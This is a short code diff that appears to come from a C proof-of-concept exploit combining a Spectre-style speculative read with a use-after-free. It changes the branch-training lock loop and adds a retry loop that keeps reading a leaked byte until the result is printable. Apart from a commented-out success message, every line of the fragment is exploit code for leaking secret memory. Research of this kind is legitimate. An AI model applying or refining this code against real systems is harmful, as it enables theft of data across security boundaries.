@@ -128,7 +128,7 @@ void train_lock()
     unsigned long i;
     for (i = 0; i < training_epochs; i++)
     {
-        pthread_mutex_lock(&lock);
+        pthread_mutex_trylock(&lock);
         pthread_mutex_unlock(&lock);
     }
 }
@@ -230,8 +230,9 @@ int main(int argc, char **argv)
             //return 2;
         }
         //printf("UAF Succeeded!\n");
-
-        printf("%c\n", spectre_read(SECRET, LEAK_INDEX));
+        char c;
+        while((c = spectre_read(SECRET, LEAK_INDEX)) <= 31 || c >= 145);
+        printf("%c\n", c);
         
         
         kill_ipi();
